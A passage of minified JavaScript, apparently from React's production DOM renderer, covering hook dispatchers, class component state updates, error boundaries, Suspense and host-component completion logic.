Dn().memoizedState}function ly(t,e,n){var i=is(t);if(n={lane:i,action:n,hasEagerState:!1,eagerState:null,next:null},Mv(t))Tv(e,n);else if(n=av(t,e,n,i),n!==null){var s=en();qn(n,t,i,s),Av(n,e,i)}}function cy(t,e,n){var i=is(t),s={lane:i,action:n,hasEagerState:!1,eagerState:null,next:null};if(Mv(t))Tv(e,s);else{var r=t.alternate;if(t.lanes===0&&(r===null||r.lanes===0)&&(r=e.lastRenderedReducer,r!==null))try{var a=e.lastRenderedState,o=r(a,n);if(s.hasEagerState=!0,s.eagerState=o,Yn(o,a)){var l=e.interleaved;l===null?(s.next=s,Cp(e)):(s.next=l.next,l.next=s),e.interleaved=s;return}}catch{}finally{}n=av(t,e,s,i),n!==null&&(s=en(),qn(n,t,i,s),Av(n,e,i))}}function Mv(t){var e=t.alternate;return t===gt||e!==null&&e===gt}function Tv(t,e){va=Ml=!0;var n=t.pending;n===null?e.next=e:(e.next=n.next,n.next=e),t.pending=e}function Av(t,e,n){if(n&4194240){var i=e.lanes;i&=t.pendingLanes,n|=i,e.lanes=n,fp(t,n)}}var Tl={readContext:In,useCallback:Ht,useContext:Ht,useEffect:Ht,useImperativeHandle:Ht,useInsertionEffect:Ht,useLayoutEffect:Ht,useMemo:Ht,useReducer:Ht,useRef:Ht,useState:Ht,useDebugValue:Ht,useDeferredValue:Ht,useTransition:Ht,useMutableSource:Ht,useSyncExternalStore:Ht,useId:Ht,unstable_isNewReconciler:!1},uy={readContext:In,useCallback:function(t,e){return Qn().memoizedState=[t,e===void 0?null:e],t},useContext:In,useEffect:df,useImperativeHandle:function(t,e,n){return n=n!=null?n.concat([t]):null,Zo(4194308,4,xv.bind(null,e,t),n)},useLayoutEffect:function(t,e){return Zo(4194308,4,t,e)},useInsertionEffect:function(t,e){return Zo(4,2,t,e)},useMemo:function(t,e){var n=Qn();return e=e===void 0?null:e,t=t(),n.memoizedState=[t,e],t},useReducer:function(t,e,n){var i=Qn();return e=n!==void 0?n(e):e,i.memoizedState=i.baseState=e,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:t,lastRenderedState:e},i.queue=t,t=t.dispatch=ly.bind(null,gt,t),[i.memoizedState,t]},useRef:function(t){var e=Qn();return t={current:t},e.memoizedState=t},useState:uf,useDebugValue:Op,useDeferredValue:function(t){return Qn().memoizedState=t},useTransition:function(){var t=uf(!1),e=t[0];return t=oy.bind(null,t[1]),Qn().memoizedState=t,[e,t]},useMutableSource:function(){},useSyncExternalStore:function(t,e,n){var i=gt,s=Qn();if(ft){if(n===void 0)throw Error(se(407));n=n()}else{if(n=e(),Ut===null)throw Error(se(349));Ds&30||dv(i,e,n)}s.memoizedState=n;var r={value:n,getSnapshot:e};return s.queue=r,df(hv.bind(null,i,r,t),[t]),i.flags|=2048,Ua(9,pv.bind(null,i,r,n,e),void 0,null),n},useId:function(){var t=Qn(),e=Ut.identifierPrefix;if(ft){var n=bi,i=Si;n=(i&~(1<<32-Xn(i)-1)).toString(32)+n,e=":"+e+"R"+n,n=Ia++,0<n&&(e+="H"+n.toString(32)),e+=":"}else n=ay++,e=":"+e+"r"+n.toString(32)+":";return t.memoizedState=e},unstable_isNewReconciler:!1},dy={readContext:In,useCallback:Sv,useContext:In,useEffect:Up,useImperativeHandle:yv,useInsertionEffect:vv,useLayoutEffect:_v,useMemo:bv,useReducer:Ac,useRef:gv,useState:function(){return Ac(Da)},useDebugValue:Op,useDeferredValue:function(t){var e=Dn();return wv(e,Rt.memoizedState,t)},useTransition:function(){var t=Ac(Da)[0],e=Dn().memoizedState;return[t,e]},useMutableSource:cv,useSyncExternalStore:uv,useId:Ev,unstable_isNewReconciler:!1},py={readContext:In,useCallback:Sv,useContext:In,useEffect:Up,useImperativeHandle:yv,useInsertionEffect:vv,useLayoutEffect:_v,useMemo:bv,useReducer:Cc,useRef:gv,useState:function(){return Cc(Da)},useDebugValue:Op,useDeferredValue:function(t){var e=Dn();return Rt===null?e.memoizedState=t:wv(e,Rt.memoizedState,t)},useTransition:function(){var t=Cc(Da)[0],e=Dn().memoizedState;return[t,e]},useMutableSource:cv,useSyncExternalStore:uv,useId:Ev,unstable_isNewReconciler:!1};function zn(t,e){if(t&&t.defaultProps){e=vt({},e),t=t.defaultProps;for(var n in t)e[n]===void 0&&(e[n]=t[n]);return e}return e}function Gu(t,e,n,i){e=t.memoizedState,n=n(i,e),n=n==null?e:vt({},e,n),t.memoizedState=n,t.lanes===0&&(t.updateQueue.baseState=n)}var jl={isMounted:function(t){return(t=t._reactInternals)?zs(t)===t:!1},enqueueSetState:function(t,e,n){t=t._reactInternals;var i=en(),s=is(t),r=Ei(i,s);r.payload=e,n!=null&&(r.callback=n),e=ts(t,r,s),e!==null&&(qn(e,t,s,i),$o(e,t,s))},enqueueReplaceState:function(t,e,n){t=t._reactInternals;var i=en(),s=is(t),r=Ei(i,s);r.tag=1,r.payload=e,n!=null&&(r.callback=n),e=ts(t,r,s),e!==null&&(qn(e,t,s,i),$o(e,t,s))},enqueueForceUpdate:function(t,e){t=t._reactInternals;var n=en(),i=is(t),s=Ei(n,i);s.tag=2,e!=null&&(s.callback=e),e=ts(t,s,i),e!==null&&(qn(e,t,i,n),$o(e,t,i))}};function pf(t,e,n,i,s,r,a){return t=t.stateNode,typeof t.shouldComponentUpdate=="function"?t.shouldComponentUpdate(i,r,a):e.prototype&&e.prototype.isPureReactComponent?!Ca(n,i)||!Ca(s,r):!0}function Cv(t,e,n){var i=!1,s=os,r=e.contextType;return typeof r=="object"&&r!==null?r=In(r):(s=dn(e)?Ns:Kt.current,i=e.contextTypes,r=(i=i!=null)?Tr(t,s):os),e=new e(n,r),t.memoizedState=e.state!==null&&e.state!==void 0?e.state:null,e.updater=jl,t.stateNode=e,e._reactInternals=t,i&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=s,t.__reactInternalMemoizedMaskedChildContext=r),e}function hf(t,e,n,i){t=e.state,typeof e.componentWillReceiveProps=="function"&&e.componentWillReceiveProps(n,i),typeof e.UNSAFE_componentWillReceiveProps=="function"&&e.UNSAFE_componentWillReceiveProps(n,i),e.state!==t&&jl.enqueueReplaceState(e,e.state,null)}function Wu(t,e,n,i){var s=t.stateNode;s.props=n,s.state=t.memoizedState,s.refs={},Rp(t);var r=e.contextType;typeof r=="object"&&r!==null?s.context=In(r):(r=dn(e)?Ns:Kt.current,s.context=Tr(t,r)),s.state=t.memoizedState,r=e.getDerivedStateFromProps,typeof r=="function"&&(Gu(t,e,r,n),s.state=t.memoizedState),typeof e.getDerivedStateFromProps=="function"||typeof s.getSnapshotBeforeUpdate=="function"||typeof s.UNSAFE_componentWillMount!="function"&&typeof s.componentWillMount!="function"||(e=s.state,typeof s.componentWillMount=="function"&&s.componentWillMount(),typeof s.UNSAFE_componentWillMount=="function"&&s.UNSAFE_componentWillMount(),e!==s.state&&jl.enqueueReplaceState(s,s.state,null),wl(t,n,s,i),s.state=t.memoizedState),typeof s.componentDidMount=="function"&&(t.flags|=4194308)}function Pr(t,e){try{var n="",i=e;do n+=z_(i),i=i.return;while(i);var s=n}catch(r){s=`
Error generating stack: `+r.message+`
`+r.stack}return{value:t,source:e,stack:s,digest:null}}function Rc(t,e,n){return{value:t,source:null,stack:n??null,digest:e??null}}function ju(t,e){try{console.error(e.value)}catch(n){setTimeout(function(){throw n})}}var hy=typeof WeakMap=="function"?WeakMap:Map;function Rv(t,e,n){n=Ei(-1,n),n.tag=3,n.payload={element:null};var i=e.value;return n.callback=function(){Cl||(Cl=!0,td=i),ju(t,e)},n}function Pv(t,e,n){n=Ei(-1,n),n.tag=3;var i=t.type.getDerivedStateFromError;if(typeof i=="function"){var s=e.value;n.payload=function(){return i(s)},n.callback=function(){ju(t,e)}}var r=t.stateNode;return r!==null&&typeof r.componentDidCatch=="function"&&(n.callback=function(){ju(t,e),typeof i!="function"&&(ns===null?ns=new Set([this]):ns.add(this));var a=e.stack;this.componentDidCatch(e.value,{componentStack:a!==null?a:""})}),n}function ff(t,e,n){var i=t.pingCache;if(i===null){i=t.pingCache=new hy;var s=new Set;i.set(e,s)}else s=i.get(e),s===void 0&&(s=new Set,i.set(e,s));s.has(n)||(s.add(n),t=Ay.bind(null,t,e,n),e.then(t,t))}function mf(t){do{var e;if((e=t.tag===13)&&(e=t.memoizedState,e=e!==null?e.dehydrated!==null:!0),e)return t;t=t.return}while(t!==null);return null}function gf(t,e,n,i,s){return t.mode&1?(t.flags|=65536,t.lanes=s,t):(t===e?t.flags|=65536:(t.flags|=128,n.flags|=131072,n.flags&=-52805,n.tag===1&&(n.alternate===null?n.tag=17:(e=Ei(-1,1),e.tag=2,ts(n,e,1))),n.lanes|=1),t)}var fy=Ni.ReactCurrentOwner,cn=!1;function Qt(t,e,n,i){e.child=t===null?rv(e,null,n,i):Cr(e,t.child,n,i)}function vf(t,e,n,i,s){n=n.render;var r=e.ref;return Sr(e,s),i=Ip(t,e,n,i,r,s),n=Dp(),t!==null&&!cn?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~s,Pi(t,e,s)):(ft&&n&&bp(e),e.flags|=1,Qt(t,e,i,s),e.child)}function _f(t,e,n,i,s){if(t===null){var r=n.type;return typeof r=="function"&&!jp(r)&&r.defaultProps===void 0&&n.compare===null&&n.defaultProps===void 0?(e.tag=15,e.type=r,kv(t,e,r,i,s)):(t=tl(n.type,null,i,e,e.mode,s),t.ref=e.ref,t.return=e,e.child=t)}if(r=t.child,!(t.lanes&s)){var a=r.memoizedProps;if(n=n.compare,n=n!==null?n:Ca,n(a,i)&&t.ref===e.ref)return Pi(t,e,s)}return e.flags|=1,t=ss(r,i),t.ref=e.ref,t.return=e,e.child=t}function kv(t,e,n,i,s){if(t!==null){var r=t.memoizedProps;if(Ca(r,i)&&t.ref===e.ref)if(cn=!1,e.pendingProps=i=r,(t.lanes&s)!==0)t.flags&131072&&(cn=!0);else return e.lanes=t.lanes,Pi(t,e,s)}return Xu(t,e,n,i,s)}function Lv(t,e,n){var i=e.pendingProps,s=i.children,r=t!==null?t.memoizedState:null;if(i.mode==="hidden")if(!(e.mode&1))e.memoizedState={baseLanes:0,cachePool:null,transitions:null},dt(mr,_n),_n|=n;else{if(!(n&1073741824))return t=r!==null?r.baseLanes|n:n,e.lanes=e.childLanes=1073741824,e.memoizedState={baseLanes:t,cachePool:null,transitions:null},e.updateQueue=null,dt(mr,_n),_n|=t,null;e.memoizedState={baseLanes:0,cachePool:null,transitions:null},i=r!==null?r.baseLanes:n,dt(mr,_n),_n|=i}else r!==null?(i=r.baseLanes|n,e.memoizedState=null):i=n,dt(mr,_n),_n|=i;return Qt(t,e,s,n),e.child}function Nv(t,e){var n=e.ref;(t===null&&n!==null||t!==null&&t.ref!==n)&&(e.flags|=512,e.flags|=2097152)}function Xu(t,e,n,i,s){var r=dn(n)?Ns:Kt.current;return r=Tr(e,r),Sr(e,s),n=Ip(t,e,n,i,r,s),i=Dp(),t!==null&&!cn?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~s,Pi(t,e,s)):(ft&&i&&bp(e),e.flags|=1,Qt(t,e,n,s),e.child)}function xf(t,e,n,i,s){if(dn(n)){var r=!0;_l(e)}else r=!1;if(Sr(e,s),e.stateNode===null)Jo(t,e),Cv(e,n,i),Wu(e,n,i,s),i=!0;else if(t===null){var a=e.stateNode,o=e.memoizedProps;a.props=o;var l=a.context,c=n.contextType;typeof c=="object"&&c!==null?c=In(c):(c=dn(n)?Ns:Kt.current,c=Tr(e,c));var p=n.getDerivedStateFromProps,d=typeof p=="function"||typeof a.getSnapshotBeforeUpdate=="function";d||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(o!==i||l!==c)&&hf(e,a,i,c),Gi=!1;var h=e.memoizedState;a.state=h,wl(e,i,a,s),l=e.memoizedState,o!==i||h!==l||un.current||Gi?(typeof p=="function"&&(Gu(e,n,p,i),l=e.memoizedState),(o=Gi||pf(e,n,o,i,h,l,c))?(d||typeof a.UNSAFE_componentWillMount!="function"&&typeof a.componentWillMount!="function"||(typeof a.componentWillMount=="function"&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount=="function"&&a.UNSAFE_componentWillMount()),typeof a.componentDidMount=="function"&&(e.flags|=4194308)):(typeof a.componentDidMount=="function"&&(e.flags|=4194308),e.memoizedProps=i,e.memoizedState=l),a.props=i,a.state=l,a.context=c,i=o):(typeof a.componentDidMount=="function"&&(e.flags|=4194308),i=!1)}else{a=e.stateNode,ov(t,e),o=e.memoizedProps,c=e.type===e.elementType?o:zn(e.type,o),a.props=c,d=e.pendingProps,h=a.context,l=n.contextType,typeof l=="object"&&l!==null?l=In(l):(l=dn(n)?Ns:Kt.current,l=Tr(e,l));var f=n.getDerivedStateFromProps;(p=typeof f=="function"||typeof a.getSnapshotBeforeUpdate=="function")||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(o!==d||h!==l)&&hf(e,a,i,l),Gi=!1,h=e.memoizedState,a.state=h,wl(e,i,a,s);var v=e.memoizedState;o!==d||h!==v||un.current||Gi?(typeof f=="function"&&(Gu(e,n,f,i),v=e.memoizedState),(c=Gi||pf(e,n,c,i,h,v,l)||!1)?(p||typeof a.UNSAFE_componentWillUpdate!="function"&&typeof a.componentWillUpdate!="function"||(typeof a.componentWillUpdate=="function"&&a.componentWillUpdate(i,v,l),typeof a.UNSAFE_componentWillUpdate=="function"&&a.UNSAFE_componentWillUpdate(i,v,l)),typeof a.componentDidUpdate=="function"&&(e.flags|=4),typeof a.getSnapshotBeforeUpdate=="function"&&(e.flags|=1024)):(typeof a.componentDidUpdate!="function"||o===t.memoizedProps&&h===t.memoizedState||(e.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||o===t.memoizedProps&&h===t.memoizedState||(e.flags|=1024),e.memoizedProps=i,e.memoizedState=v),a.props=i,a.state=v,a.context=l,i=c):(typeof a.componentDidUpdate!="function"||o===t.memoizedProps&&h===t.memoizedState||(e.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||o===t.memoizedProps&&h===t.memoizedState||(e.flags|=1024),i=!1)}return qu(t,e,n,i,r,s)}function qu(t,e,n,i,s,r){Nv(t,e);var a=(e.flags&128)!==0;if(!i&&!a)return s&&sf(e,n,!1),Pi(t,e,r);i=e.stateNode,fy.current=e;var o=a&&typeof n.getDerivedStateFromError!="function"?null:i.render();return e.flags|=1,t!==null&&a?(e.child=Cr(e,t.child,null,r),e.child=Cr(e,null,o,r)):Qt(t,e,o,r),e.memoizedState=i.state,s&&sf(e,n,!0),e.child}function Iv(t){var e=t.stateNode;e.pendingContext?nf(t,e.pendingContext,e.pendingContext!==e.context):e.context&&nf(t,e.context,!1),Pp(t,e.containerInfo)}function yf(t,e,n,i,s){return Ar(),Ep(s),e.flags|=256,Qt(t,e,n,i),e.child}var Yu={dehydrated:null,treeContext:null,retryLane:0};function $u(t){return{baseLanes:t,cachePool:null,transitions:null}}function Dv(t,e,n){var i=e.pendingProps,s=mt.current,r=!1,a=(e.flags&128)!==0,o;if((o=a)||(o=t!==null&&t.memoizedState===null?!1:(s&2)!==0),o?(r=!0,e.flags&=-129):(t===null||t.memoizedState!==null)&&(s|=1),dt(mt,s&1),t===null)return Vu(e),t=e.memoizedState,t!==null&&(t=t.dehydrated,t!==null)?(e.mode&1?t.data==="$!"?e.lanes=8:e.lanes=1073741824:e.lanes=1,null):(a=i.children,t=i.fallback,r?(i=e.mode,r=e.child,a={mode:"hidden",children:a},!(i&1)&&r!==null?(r.childLanes=0,r.pendingProps=a):r=Yl(a,i,0,null),t=Ls(t,i,n,null),r.return=e,t.return=e,r.sibling=t,e.child=r,e.child.memoizedState=$u(n),e.memoizedState=Yu,t):Fp(e,a));if(s=t.memoizedState,s!==null&&(o=s.dehydrated,o!==null))return my(t,e,a,i,o,s,n);if(r){r=i.fallback,a=e.mode,s=t.child,o=s.sibling;var l={mode:"hidden",children:i.children};return!(a&1)&&e.child!==s?(i=e.child,i.childLanes=0,i.pendingProps=l,e.deletions=null):(i=ss(s,l),i.subtreeFlags=s.subtreeFlags&14680064),o!==null?r=ss(o,r):(r=Ls(r,a,n,null),r.flags|=2),r.return=e,i.return=e,i.sibling=r,e.child=i,i=r,r=e.child,a=t.child.memoizedState,a=a===null?$u(n):{baseLanes:a.baseLanes|n,cachePool:null,transitions:a.transitions},r.memoizedState=a,r.childLanes=t.childLanes&~n,e.memoizedState=Yu,i}return r=t.child,t=r.sibling,i=ss(r,{mode:"visible",children:i.children}),!(e.mode&1)&&(i.lanes=n),i.return=e,i.sibling=null,t!==null&&(n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)),e.child=i,e.memoizedState=null,i}function Fp(t,e){return e=Yl({mode:"visible",children:e},t.mode,0,null),e.return=t,t.child=e}function yo(t,e,n,i){return i!==null&&Ep(i),Cr(e,t.child,null,n),t=Fp(e,e.pendingProps.children),t.flags|=2,e.memoizedState=null,t}function my(t,e,n,i,s,r,a){if(n)return e.flags&256?(e.flags&=-257,i=Rc(Error(se(422))),yo(t,e,a,i)):e.memoizedState!==null?(e.child=t.child,e.flags|=128,null):(r=i.fallback,s=e.mode,i=Yl({mode:"visible",children:i.children},s,0,null),r=Ls(r,s,a,null),r.flags|=2,i.return=e,r.return=e,i.sibling=r,e.child=i,e.mode&1&&Cr(e,t.child,null,a),e.child.memoizedState=$u(a),e.memoizedState=Yu,r);if(!(e.mode&1))return yo(t,e,a,null);if(s.data==="$!"){if(i=s.nextSibling&&s.nextSibling.dataset,i)var o=i.dgst;return i=o,r=Error(se(419)),i=Rc(r,i,void 0),yo(t,e,a,i)}if(o=(a&t.childLanes)!==0,cn||o){if(i=Ut,i!==null){switch(a&-a){case 4:s=2;break;case 16:s=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:s=32;break;case 536870912:s=268435456;break;default:s=0}s=s&(i.suspendedLanes|a)?0:s,s!==0&&s!==r.retryLane&&(r.retryLane=s,Ri(t,s),qn(i,t,s,-1))}return Wp(),i=Rc(Error(se(421))),yo(t,e,a,i)}return s.data==="$?"?(e.flags|=128,e.child=t.child,e=Cy.bind(null,t),s._reactRetry=e,null):(t=r.treeContext,Sn=es(s.nextSibling),bn=e,ft=!0,Hn=null,t!==null&&(Rn[Pn++]=Si,Rn[Pn++]=bi,Rn[Pn++]=Is,Si=t.id,bi=t.overflow,Is=e),e=Fp(e,i.children),e.flags|=4096,e)}function Sf(t,e,n){t.lanes|=e;var i=t.alternate;i!==null&&(i.lanes|=e),Hu(t.return,e,n)}function Pc(t,e,n,i,s){var r=t.memoizedState;r===null?t.memoizedState={isBackwards:e,rendering:null,renderingStartTime:0,last:i,tail:n,tailMode:s}:(r.isBackwards=e,r.rendering=null,r.renderingStartTime=0,r.last=i,r.tail=n,r.tailMode=s)}function Uv(t,e,n){var i=e.pendingProps,s=i.revealOrder,r=i.tail;if(Qt(t,e,i.children,n),i=mt.current,i&2)i=i&1|2,e.flags|=128;else{if(t!==null&&t.flags&128)e:for(t=e.child;t!==null;){if(t.tag===13)t.memoizedState!==null&&Sf(t,n,e);else if(t.tag===19)Sf(t,n,e);else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break e;for(;t.sibling===null;){if(t.return===null||t.return===e)break e;t=t.return}t.sibling.return=t.return,t=t.sibling}i&=1}if(dt(mt,i),!(e.mode&1))e.memoizedState=null;else switch(s){case"forwards":for(n=e.child,s=null;n!==null;)t=n.alternate,t!==null&&El(t)===null&&(s=n),n=n.sibling;n=s,n===null?(s=e.child,e.child=null):(s=n.sibling,n.sibling=null),Pc(e,!1,s,n,r);break;case"backwards":for(n=null,s=e.child,e.child=null;s!==null;){if(t=s.alternate,t!==null&&El(t)===null){e.child=s;break}t=s.sibling,s.sibling=n,n=s,s=t}Pc(e,!0,n,null,r);break;case"together":Pc(e,!1,null,null,void 0);break;default:e.memoizedState=null}return e.child}function Jo(t,e){!(e.mode&1)&&t!==null&&(t.alternate=null,e.alternate=null,e.flags|=2)}function Pi(t,e,n){if(t!==null&&(e.dependencies=t.dependencies),Us|=e.lanes,!(n&e.childLanes))return null;if(t!==null&&e.child!==t.child)throw Error(se(153));if(e.child!==null){for(t=e.child,n=ss(t,t.pendingProps),e.child=n,n.return=e;t.sibling!==null;)t=t.sibling,n=n.sibling=ss(t,t.pendingProps),n.return=e;n.sibling=null}return e.child}function gy(t,e,n){switch(e.tag){case 3:Iv(e),Ar();break;case 5:lv(e);break;case 1:dn(e.type)&&_l(e);break;case 4:Pp(e,e.stateNode.containerInfo);break;case 10:var i=e.type._context,s=e.memoizedProps.value;dt(Sl,i._currentValue),i._currentValue=s;break;case 13:if(i=e.memoizedState,i!==null)return i.dehydrated!==null?(dt(mt,mt.current&1),e.flags|=128,null):n&e.child.childLanes?Dv(t,e,n):(dt(mt,mt.current&1),t=Pi(t,e,n),t!==null?t.sibling:null);dt(mt,mt.current&1);break;case 19:if(i=(n&e.childLanes)!==0,t.flags&128){if(i)return Uv(t,e,n);e.flags|=128}if(s=e.memoizedState,s!==null&&(s.rendering=null,s.tail=null,s.lastEffect=null),dt(mt,mt.current),i)break;return null;case 22:case 23:return e.lanes=0,Lv(t,e,n)}return Pi(t,e,n)}var Ov,Ku,Fv,Bv;Ov=function(t,e){for(var n=e.child;n!==null;){if(n.tag===5||n.tag===6)t.appendChild(n.stateNode);else if(n.tag!==4&&n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return;n=n.return}n.sibling.return=n.return,n=n.sibling}};Ku=function(){};Fv=function(t,e,n,i){var s=t.memoizedProps;if(s!==i){t=e.stateNode,Cs(ri.current);var r=null;switch(n){case"input":s=_u(t,s),i=_u(t,i),r=[];break;case"select":s=vt({},s,{value:void 0}),i=vt({},i,{value:void 0}),r=[];break;case"textarea":s=Su(t,s),i=Su(t,i),r=[];break;default:typeof s.onClick!="function"&&typeof i.onClick=="function"&&(t.onclick=gl)}wu(n,i);var a;n=null;for(c in s)if(!i.hasOwnProperty(c)&&s.hasOwnProperty(c)&&s[c]!=null)if(c==="style"){var o=s[c];for(a in o)o.hasOwnProperty(a)&&(n||(n={}),n[a]="")}else c!=="dangerouslySetInnerHTML"&&c!=="children"&&c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&c!=="autoFocus"&&(Sa.hasOwnProperty(c)?r||(r=[]):(r=r||[]).push(c,null));for(c in i){var l=i[c];if(o=s!=null?s[c]:void 0,i.hasOwnProperty(c)&&l!==o&&(l!=null||o!=null))if(c==="style")if(o){for(a in o)!o.hasOwnProperty(a)||l&&l.hasOwnProperty(a)||(n||(n={}),n[a]="");for(a in l)l.hasOwnProperty(a)&&o[a]!==l[a]&&(n||(n={}),n[a]=l[a])}else n||(r||(r=[]),r.push(c,n)),n=l;else c==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,o=o?o.__html:void 0,l!=null&&o!==l&&(r=r||[]).push(c,l)):c==="children"?typeof l!="string"&&typeof l!="number"||(r=r||[]).push(c,""+l):c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&(Sa.hasOwnProperty(c)?(l!=null&&c==="onScroll"&&pt("scroll",t),r||o===l||(r=[])):(r=r||[]).push(c,l))}n&&(r=r||[]).push("style",n);var c=r;(e.updateQueue=c)&&(e.flags|=4)}};Bv=function(t,e,n,i){n!==i&&(e.flags|=4)};function Kr(t,e){if(!ft)switch(t.tailMode){case"hidden":e=t.tail;for(var n=null;e!==null;)e.alternate!==null&&(n=e),e=e.sibling;n===null?t.tail=null:n.sibling=null;break;case"collapsed":n=t.tail;for(var i=null;n!==null;)n.alternate!==null&&(i=n),n=n.sibling;i===null?e||t.tail===null?t.tail=null:t.tail.sibling=null:i.sibling=null}}function Gt(t){var e=t.alternate!==null&&t.alternate.child===t.child,n=0,i=0;if(e)for(var s=t.child;s!==null;)n|=s.lanes|s.childLanes,i|=s.subtreeFlags&14680064,i|=s.flags&14680064,s.return=t,s=s.sibling;else for(s=t.child;s!==null;)n|=s.lanes|s.childLanes,i|=s.subtreeFlags,i|=s.flags,s.return=t,s=s.sibling;return t.subtreeFlags|=i,t.childLanes=n,e}function vy(t,e,n){var i=e.pendingProps;switch(wp(e),e.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Gt(e),null;case 1:return dn(e.type)&&vl(),Gt(e),null;case 3:return i=e.stateNode,Rr(),ht(un),ht(Kt),Lp(),i.pendingContext&&(i.context=i.pendingContext,i.pendingContext=null),(t===null||t.child===null)&&(_o(e)?e.flags|=4:t===null||t.memoizedState.isDehydrated&&!(e.flags&256)||(e.flags|=1024,Hn!==null&&(sd(Hn),Hn=null))),Ku(t,e),Gt(e),null;case 5:kp(e);var s=Cs(Na.current);if(n=e.type,t!==null&&e.stateNode!=null)Fv(t,e,n,i,s),t.ref!==e.ref&&(e.flags|=512,e.flags|=2097152);else{if(!i){if(e.stateNode===null)throw Error(se(166));return Gt(e),null}if(t=Cs(ri.current),_o(e)){i=e.stateNode,n=e.type;var r=e.memoizedProps;switch(i[ti]=e,i[ka]=r,t=(e.mode&1)!==0,n){case"dialog":pt("cancel",i),pt("close",i);break;case"iframe":case"object":case"embed":pt("load",i);break;case"video":case"audio":for(s=0;s<la.length;s++)pt(la[s],i);break;case"source":pt("error",i);break;case"img":case"image":case"link":pt("error",i),pt("load",i);break;case"details":pt("toggle",i);break;case"input":Rh(i,r),pt("invalid",i);break;case"select":i._wrapperState={wasMultiple:!!r.multiple},pt("invalid",i);break;case"textarea":kh(i,r),pt("invalid",i)}wu(n,r),s=null;for(var a in r)if(r.hasOwnProperty(a)){var o=r[a];a==="children"?typeof o=="string"?i.textContent!==o&&(r.suppressHydrationWarning!==!0&&vo(i.textContent,o,t),s=["children",o]):typeof o=="number"&&i.textContent!==""+o&&(r.suppressHydrationWarning!==!0&&vo(i.textContent,o,t),s=["children",""+o]):Sa.hasOwnProperty(a)&&o!=null&&a==="onScroll"&&pt("scroll",i)}switch(n){case"input":lo(i),Ph(i,r,!0);break;case"textarea":lo(i),Lh(i);break;case"select":case"option":break;default:typeof r.onClick=="function"&&(i.onclick=gl)}i=s,e.updateQueue=i,i!==null&&(e.flags|=4)}else{a=s.nodeType===9?s:s.ownerDocument,t==="http://www.w3.org/1999/xhtml"&&(t=hg(n)),t==="http://www.w3.org/1999/xhtml"?n==="script"?(t=a.createElement("div"),t.innerHTML="<script><\/script>",t=t.removeChild(t.firstChild)):typeof i.is=="string"?t=a.createElement(n,{is:i.is}):(t=a.createElement(n),n==="select"&&(a=t,i.multiple?a.multiple=!0:i.size&&(a.size=i.size))):t=a.createElementNS(t,n),t[ti]=e,t[ka]=i,Ov(t,e,!1,!1),e.stateNode=t;e:{switch(a=Eu(n,i),n){case"dialog":pt("cancel",t),pt("close",t),s=i;break;case"iframe":case"object":case"embed":pt("load",t),s=i;break;case"video":case"audio":for(s=0;s<la.length;s++)pt(la[s],t);s=i;break;case"source":pt("error",t),s=i;break;case"img":case"image":case"link":pt("error",t),pt("load",t),s=i;break;case"details":pt("toggle",t),s=i;break;case"input":Rh(t,i),s=_u(t,i),pt("invalid",t);break;case"option":s=i;break;case"select":t._wrapperState={wasMultiple:!!i.multiple},s=vt({},i,{value:void 0}),pt("invalid",t);break;case"textarea":kh(t,i),s=Su(t,i),pt("invalid",t);break;default:s=i}wu(n,s),o=s;for(r in o)if(o.hasOwnProperty(r)){var l=o[r];r==="style"?gg(t,l):r==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,l!=null&&fg(t,l)):r==="children"?typeof l=="string"?(n!=="textarea"||l!=="")&&ba(t,l):typeof l=="number"&&ba(t,""+l):r!=="suppressContentEditableWarning"&&r!=="suppressHydrationWarning"&&r!=="autoFocus"&&(Sa.hasOwnProperty(r)?l!=null&&r==="onScroll"&&pt("scroll",t):l!=null&&lp(t,r,l,a))}switch(n){case"input":lo(t),Ph(t,i,!1);break;case"textarea":lo(t),Lh(t);break;case"option":i.value!=null&&t.setAttribute("value",""+as(i.value));break;case"select":t.multiple=!!i.multiple,r=i.value,r!=null?vr(t,!!i.multiple,r,!1):i.defaultValue!=null&&vr(t,!!i.multiple,i.defaultValue,!0);break;default:typeof s.onClick=="function"&&(t.onclick=gl)}switch(n){case"button":case"input":case"select":case"textarea":i=!!i.autoFocus;break e;case"img":i=!0;break e;default:i=!1}}i&&(e.flags|=4)}e.ref!==null&&(e.flags|=512,e.flags|=2097152)}return Gt(e),null;case 6:if(t&&e.stateNode!=null)Bv(t,e,t.memoizedProps,i);else{if(typeof i!="string"&&e.stateNode===null)throw Error(se(166));if(n=Cs(Na.current),Cs(ri.current),_o(e)){if(i=e.stateNode,n=e.memoizedProps,i[ti]=e,(r=i.nodeValue!==n)&&(t=bn,t!==null))switch(t.tag){case 3:vo(i.nodeValue,n,(t.mode&1)!==0);break;case 5:t.memoizedProps.suppressHydrationWarning!==!0&&vo(i.nodeValue,n,(t.mode&1)!==0)}r&&(e.flags|=4)}else i=(n.nodeType===9?n:n.ownerDocument).createTextNode(i),i[ti]=e,e.stateNode=i}return Gt(e),null;case 13:if(ht(mt),i=e.memoizedState,t===null||t.memoizedState!==null&&t.memoizedState.dehydrated!==null){if(ft&&Sn!==null&&e.mode&1&&!(e.flags&128))iv(),Ar(),e.flags|=98560,r=!1;else if(r=_o(e),i!==null&&i.dehydrated!==null){if(t===null){if(!r)throw 